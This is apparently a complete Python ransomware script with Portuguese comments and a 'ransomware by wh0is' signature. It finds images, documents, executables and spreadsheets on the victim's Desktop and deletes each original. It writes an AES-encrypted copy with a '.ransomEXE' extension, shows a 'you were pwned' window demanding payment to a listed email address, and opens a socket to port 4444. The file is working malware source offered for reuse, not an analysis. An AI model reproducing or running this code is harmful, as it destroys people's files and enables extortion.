import os
import sys
import time
import pyaes
import socket
import threading
import glob
from pathlib import Path
from tkinter import *

"""
você pode mexer na script via nano, vim, ou tanto faz para modificar, ou tirar algum arquivo, qualquer coisa, para o benefício.
"""

list_doc = ["*.jpg", "*.pdf", "*.exe", "*.png", "*.ico", "*.mp3", "*.mp4", "*.py", "*.xlsx"]

try:
    desktop = Path.home() / "OneDrive\Área de Trabalho" or "Área de trabalho"
    download = Path.home() / "OneDrive/Downloads" or "Downloads"
except Exception as error:
    pass
    
os.chdir(desktop)

def connectionsFile():
    
    try:
        for files in list_doc:
            for formattin in glob.glob(files):   
                print(formattin)
                file = open(f'{desktop}\\{formattin}', 'rb')
                filedata = file.read()
                file.close()
                try:
                    global text
                    r = Tk()
                    r.title("Você foi pwnado.")
                    r.geometry("1000x1000")
                    text = Label(text="Seus dados foram encriptados, todos! Pague o resgate agora para recuperar.\n\nemail: debonewtcom@proton.me\n\nransomware by wh0is",font=("Arial Black",15)).pack(pady=25)
                    r.mainloop()
                except Exception as error:
                    pass
                os.remove(f'{desktop}\\{formattin}')
                key = b'NUnN9502jasaiN0m' #16 bits key
                aes = pyaes.AESModeOfOperationCTR(key)
                crypter = aes.encrypt(filedata)
                novofile = formattin + ".ransomEXE"
                novofile = open(f'{desktop}\\{novofile}', 'wb')
                novofile.write(crypter)
        novofile.close()
    except:
        pass

if __name__ == "__main__":
    #como está em localhost, você não precisa por seu endereço ip real para se conectar
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 4444))
    connectionsFile()
    
threading.Thread(target=connectionsFile).start()